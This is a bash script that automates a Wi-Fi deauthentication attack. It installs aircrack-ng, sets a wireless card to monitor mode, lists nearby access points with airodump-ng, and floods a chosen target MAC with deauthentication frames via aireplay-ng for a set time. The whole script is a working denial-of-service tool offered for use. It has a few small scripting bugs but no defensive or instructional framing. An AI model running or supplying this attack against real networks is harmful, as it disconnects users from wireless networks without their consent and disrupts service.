#!/bin/bash

#
# deauthAttackMadeEasy v1.1
#

configLocation=".deauthAttack.config"

echo "Welcome to the siiiimplist way to deauth WAPs!"
sleep 0.1

function checkRequirements() {
#install requirements
if [ ! -f /sbin/ifconfig ] || [ ! -f /usr/bin/aircrack-ng ]
then
	echo "It seams that you don't have one of the required packages for this script installed:"
	echo "net-tools (ifconfig), or aircrack-ng (airmon-ng)."
	echo "Would you like me to install the packages?"
	echo "[y/N] "

	read optionForRequirements

	if [ $optionForRequirements = "y" ]
	then
		sudo apt install -y net-tools aircrack-ng
		echo $'\nPackages installed\n'

	elif [ $optionForRequirements = "n" ]
	then
		echo "Exiting"
		exit
	fi

fi

}

function checkInterfaces() {
#display network interfaces

devNetNum=0

loadInterface

echo $'Listing your usable and available network interfaces...\n'

for i in $( ifconfig -a -s | cut -f1 -d' '  | sed -e 's/Iface//g' | sed -e 's/lo//g' | sed '/^\s*$/d' ); do
	devNetNum=$((devNetNum + 1))
	echo [$devNetNum]: $i

done

echo "[Q/e]: Quit/Exit"
echo -n $'\nPlease select your Wireless Interface:\n'
read wifdr

if [[ $wifdr =~ ^-?[0-9]+$ ]]
then
	wifd=$( ifconfig -a -s | cut -f1 -d' ' | sed -e 's/Iface//g' | sed -e 's/lo//g' | sed '/^\s*$/d' | sed "${wifdr}p;d" )

else
	wifd=$(echo $wifdr)

fi

if [ $wifdr = "q" ] || [ $wifdr = "Q" ] || [ $wifdr = "e" ] || [ $wifdr = "E" ]
then
	exit
fi

useInterface

}

function useInterface() {
#selecting interface to use

mon="mon"

echo -n "Proceed using $wifd? [Y/n] "
read pwuwifd

if [ $pwuwifd = y ] || [ $pwuwifd = Y ]
then
	saveInterface
	setupDevice

elif [ $pwuwifd = n ] || [ $pwuwifd = N ]
then

	echo "Exiting..."
	exit

else
	useInterface

fi

}

function saveInterface() {

echo -n "Would you like to save this interface for later use? [Y/n] "
read saveIntface

if [ $saveIntface = y ] || [ $saveIntface = Y ]
then

	echo "interface: $wifd" > $configLocation

elif [ $saveIntface = n ] || [ $saveIntface = N ]
then

	echo "Leaving"
else
	saveInterface

fi

}

function loadInterface() {

if [ -f $configLocation ]
then

	echo -n "Use config? [Y/n] "
	read useConfig

	if [ $useConfig = y ] || [ $useConfig = Y ]
	then

		echo "Using last saved/used interface..."
		wifd=$(cat $configLocation | grep interface: | cut -f2 -d' ')
		setupDevice

	elif [ $useConfig = n ] || [ $useConfig = N ]
	then
		echo "Leaving config... "

	else
		loadInterface

	fi

fi

}

function setupDevice() {
#sets into monitor mode

airmon-ng start $wifd > /dev/null && echo "Monitor mode enabled for: $wifd"

echo "At anypoint, if you Ctrl^C a point where this program is still running, disabling monitor mode is as easy as typing exactly: 'airmon-ng stop $wifd$mon'"
sleep 3

listAccessPoints

}

function listAccessPoints() {
#opens airodump-ng to display MAC addresses

mon="mon"
wifdlAP="$wifd$mon"

echo "Press Ctrl^C when you see the target network(s)..."
sleep 3

#ifconfig | grep h0 | cut -f1 -d' '

airodump-ng $wifdlAP

changeChannel

}

function changeChannel() {
#select target channel, reconfigure monitor mode with selected channel

echo -n "Enter target channel (number): "
read targetChannel

if [[ $targetChannel =~ ^-?[0-9]+$ ]]
then
	airmon-ng stop $wifd$mon > /dev/null && echo "Reconfiguring $wifd"
	airmon-ng start $wifd $targetChannel > /dev/null && echo "Monitor mode enabled on channel $targetChannel for: $wifd"
	selectTarget

else
	echo "'$targetChannel' is not a number... please type a number..."
	changeChannel
fi


}

function selectTarget() {
#selecting a MAC address

echo -n "Please enter target MAC address."
echo -n "You can copy from above."
echo -n "Target: "
read targetMAC

#execution
setTime

}

function execution() {
#ready to run, can still back out

echo -n "Are you sure that you want to run this attack? [Y/n] "
read execDeauth

if [ $execDeauth = y ] || [ $execDeauth = Y ]
then

	#setTime
	runAttack

elif [ $execDeauth = n ] || [ $execDeauth = N ]
then

	#deconfigure to cancel
        echo "Exiting and reconfiguring $wifd..."
        airmon-ng stop $wifd$mon > /dev/null
	echo "Reconfiguring complete, exiting..."
	exit

else
        execution

fi

}

function setTime() {
#sets the length for the attack

echo -n "Please enter seconds to run deauth attack for: "
read length

if [[ $length =~ ^-?[0-9]+$ ]]
then

	if [ $length = "-1" ]
	then

		$length = "9999999999"

	fi

	#runAttack
	execution

	sss="s"

else
	setTime

fi

}

function runAttack() {
#this executes the commands with user variables

echo "About to run; Reminder to press Ctrl^C when you're happy with your attack!"
sleep 2

timeout $length$sss aireplay-ng -0 0 -a $targetMAC $wifd$mon

#deconfigure from monitor mode
echo "Attack finished; Reconfiguring interface $wifd and closing..."
airmon-ng stop $wifd$mon > /dev/null
echo "Complete. Done."
exit

}

#Initalise program
checkRequirements
checkInterfaces
